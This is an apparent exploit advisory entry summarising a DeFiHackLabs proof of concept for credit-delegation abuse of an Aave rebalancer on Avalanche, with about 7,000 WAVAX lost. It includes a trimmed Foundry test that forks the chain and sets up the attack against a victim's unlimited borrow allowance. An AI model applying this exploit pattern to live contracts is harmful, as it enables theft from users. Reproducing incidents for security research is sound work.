# [?] AaveRebalancerCreditDelegation - Arbitrary External Call / Credit Delegation Abuse

## Summary
Severity: Unknown
Chain: Avalanche
Component: AaveRebalancerCreditDelegation
Published: 2026-04-19
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/AaveRebalancerCreditDelegation_exp.sol
Type: defi-exploit-poc

## Details
Lost: 6,999.91 WAVAX

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    IAaveFlashloan private constant pool = IAaveFlashloan(AAVE_POOL);
    IERC20 private constant wavax = IERC20(WAVAX);
    IERC20 private constant savax = IERC20(SAVAX);
    IERC20 private constant usdc = IERC20(USDC_TOKEN);
    IVariableDebtToken private constant variableDebtWavax = IVariableDebtToken(VARIABLE_DEBT_WAVAX);

    function setUp() public {
        uint256 forkBlock = 83_324_252;
        vm.createSelectFork("avalanche", forkBlock);

        vm.label(ATTACKER, "Attacker / Profit Receiver");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(VULNERABLE_REBALANCER, "Vulnerable sAVAX Rebalancer");
        vm.label(VICTIM, "Victim");
        vm.label(AAVE_POOL, "Aave V3 Pool");
        vm.label(WAVAX, "WAVAX");
        vm.label(SAVAX, "sAVAX");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(VARIABLE_DEBT_WAVAX, "variableDebtAvaWAVAX");
    }

    function testExploit() public {
        uint256 victimDebtBefore = variableDebtWavax.balanceOf(VICTIM);
        uint256 attackerWavaxBefore = wavax.balanceOf(ATTACKER);
        uint256 delegatedBorrowAllowance = variableDebtWavax.borrowAllowance(VICTIM, VULNERABLE_REBALANCER);
        assertEq(delegatedBorrowAllowance, type(uint256).max);

        uint256 setupBorrowAmount = 0.01 ether;
        uint256 savaxDepositPerRebalance = 0.001 ether;
        uint256 maliciousBorrowAmount = 7_000 ether;

        // step 1: create the tiny local Aave position needed for the rebalancer's normal borrow path.
        deal(USDC_TOKEN, address(this), 1e6);
        deal(SAVAX, address(this), 2 * savaxDepositPerRebalance);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/AaveRebalancerCreditDelegation_exp.sol_
